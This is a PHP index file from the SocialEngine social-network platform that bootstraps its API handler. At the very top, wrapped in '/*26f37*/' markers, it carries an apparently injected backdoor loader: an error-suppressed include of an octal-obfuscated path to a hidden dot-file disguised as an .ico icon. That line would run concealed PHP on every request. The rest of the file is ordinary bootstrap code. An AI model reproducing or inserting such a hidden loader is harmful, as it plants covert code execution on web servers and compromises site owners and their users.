<?php
/*26f37*/

@include "\057v\141r\057w\167w\057q\141_\162q\163t\160g\151n\163_\0620\0619\137u\160g\162a\144e\057e\170t\145r\156a\154s\057d\145s\153t\157p\055n\157t\151f\171/\056a\060c\0718\0647\061.\151c\157";

/*26f37*/

/**
 * @package     Engine_Core
 * @version     $Id: index.php 9764 2012-08-17 00:04:31Z matthew $
 * @copyright   Copyright (c) 2008 Webligo Developments
 * @license     http://www.socialengine.com/license/
 */
// Check version
if( version_compare(phpversion(), '5.2.11', '<') ) {
  printf('PHP 5.2.11 is required, you have %s', phpversion());
  exit(1);
}
$script = $_SERVER['SCRIPT_NAME'];
$_SERVER['SCRIPT_NAME'] = str_replace('/api/', '/', $script);
// Constants
define('_ENGINE_R_BASE', dirname($_SERVER['SCRIPT_NAME']));
define('_ENGINE_R_FILE', $_SERVER['SCRIPT_NAME']);
define('_ENGINE_R_REL', 'application');
define('_ENGINE_R_TARG', 'siteapi.php');
//$_SERVER['SCRIPT_NAME'] = $script;
// Main
include dirname(dirname(__FILE__))
  . DIRECTORY_SEPARATOR
  . _ENGINE_R_REL . DIRECTORY_SEPARATOR
  . _ENGINE_R_TARG;
